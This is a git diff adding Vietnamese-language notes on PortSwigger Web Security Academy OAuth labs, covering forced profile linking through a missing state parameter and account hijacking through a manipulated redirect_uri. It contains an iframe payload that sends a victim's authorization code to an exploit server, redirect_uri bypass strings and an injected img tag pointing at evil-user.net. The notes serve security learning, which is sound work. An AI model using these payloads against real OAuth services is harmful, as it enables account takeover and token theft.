@@ -88,16 +88,80 @@ Khi thiếu parameter `state` hoặc `state` rỗng, thì có thể tấn công 
 ## 2. Forced OAuth profile linking
 https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
 
+Luồng: Khi đăng nhập bằng tài khoản thường, sau đó link với tài khoản mạng xã hội khác thì có thể đăng nhập bằng mạng xã hội khác 
 
+Đầu tiên đăng nhập bằng tài khoản thường, sau đó link với tài khoản mxh.
 
+Nhập các thông tin đăng nhập của mxh đó. 
 
+Ta thấy có URL:\
+![alt text](image-2.png)
 
+Ta thấy `code` này gửi đi không kèm theo `state` nên không có chuỗi xác thực nào để xác thực, do đó bất kì ai gửi URL này với `code` hợp lệ (chưa được sử dụng) thì đều sẽ liên kết với tài khoản mxh mà ta vừa nhập.
 
+{Đây là lỗ hổng ở bước thứ 3 `Authorization code grant`}
+
+Do đó, sau khi link với mxh, ta sẽ chặn ở đây, để lấy code hợp lệ, và gửi cho victim, bên victim khi truy cập URL này sẽ link với tài khoản MXH của ta. 
+
+Từ đó chiếm quyền điều khiểm tk victim.
+
+Bắt gói tin và lấy `code` sau đó drop gói tin có `code` đó đi để code đó chưa được sử dụng, sau đó đưa vào exploit:\
+![alt text](image-3.png)
+
+Thành công thì khi đăng nhập bằng tài khoản mxh sẽ vào được admin:\
+![alt text](image-4.png)
 
 ---
 
+Tùy thuộc vào grant type, code hoặc token sẽ được gửi qua trình duyệt của nạn nhân đến endpoint `/callback` được chỉ định trong tham số `redirect_uri` của yêu cầu ủy quyền.
+
+Nếu dịch vụ OAuth không xác thực đúng URI này, kẻ tấn công có thể xây dựng một cuộc tấn công giống như CSRF, lừa trình duyệt của nạn nhân khởi tạo luồng OAuth sẽ gửi mã hoặc mã thông báo đến `redirect_uri` do kẻ tấn công kiểm soát.
+
+---
 ## 3. OAuth account hijacking via redirect_uri
 https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri
+
+Ở bài này, chúng ta sẽ sửa đổi `redirect-uri` để khi trả `code` về nó sẽ gửi sang 1 uri khác (uri của attacker) và ta sẽ đánh cắp được `code` của victim và từ đó log in được tài khoản của họ.
+
+Khi đăng nhập bình thường:\
+![alt text](image-5.png)
+
+Payload:
+```html
+<iframe src="https://oauth-0af700d0036fa0fb80eb247802ce0070.oauth-server.net/auth?client_id=w14coh8eomht8n4frd1w3&redirect_uri=https://exploit-0ad900ca0365a06880bc25b301f00086.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+```
+
+Ở đây ta chú ý, `client_id` vẫn giống như khi ta đăng nhập, do id này đại diện cho application ta đang sử dụng nên nó giống nhau, ta sẽ tiêm vào uri sang exploit server.
+
+---
+
+Để tránh lỗi này, hướng có thể là tạo 1 whitelist `redirect_uri` để tránh uri attacker tiêm vào.
+
+Mặc dù vậy vẫn có 1 số cách làm sai quy trình xử lí của nó như: 
+- Chỉ check đoạn đầu (domain chính)
+- Dùng kỹ thuật để thoát chuỗi ban đầu `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
+- Thử duplicate param `redirec_uri`
+- Thử với `localhost` vì trong quá trình test thử có thể vẫn còn giữ
+
+---
+# Stealing codes and access tokens via a proxy page
+
+Khi redirect_uri bị giới hạn, ta sẽ thử tiêm vào chuỗi:\ 
+`https://client-app.com/oauth/callback/../../example/path`
+
+Mục đích để gây nhiễu và tìm ra path nào khác khả thi không, điều này có thể dẫn tới việc truy cập: \
+`https://client-app.com/example/path`
+
+Sau khi xác định được trang mà có thể redirect tới (khác với uri mặc định), ta sẽ thử tìm thêm lỗi ở trang đó, nếu nó có những lỗi như `open redirect` thì có thể tận dụng nó để đánh cắp token được gửi đến. 
+
+Ngoài `open redirect` ta có thể tìm các lỗi như: 
+- Dangerous JavaScript that handles query parameters and URL fragments
+- XSS
+- HTML injection: khi có thể chèn 1 html `<img src="evil-user.net">` khi bắt gói tin, chú ý phần `Referer` đôi khi ta có thể lấy được url của request trước tới server đó.
+
+---
+## 4. Stealing OAuth access tokens via an open redirect
+https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
 
 
 
